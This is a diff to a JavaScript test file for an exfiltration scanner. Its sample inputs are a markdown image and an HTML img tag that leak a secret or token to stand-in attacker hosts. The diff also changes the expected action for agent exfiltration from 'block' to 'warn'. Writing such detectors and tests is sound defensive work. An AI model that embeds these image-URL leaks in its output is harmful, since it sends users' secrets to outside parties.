@@ -6,7 +6,7 @@ test('flags markdown image with remote URL as exfiltration', () => {
   const flags = scanExfil('Here is your report ![x](https://attacker.example/leak?d=SECRET)');
   assert.equal(flags.length >= 1, true);
   assert.equal(flags[0].type, 'agent_exfiltration');
-  assert.equal(flags[0].action, 'block');
+  assert.equal(flags[0].action, 'warn');
 });
 test('flags html img with remote src', () => {
   assert.equal(scanExfil('<img src="https://evil.example/pixel.png?t=abc">').length >= 1, true);
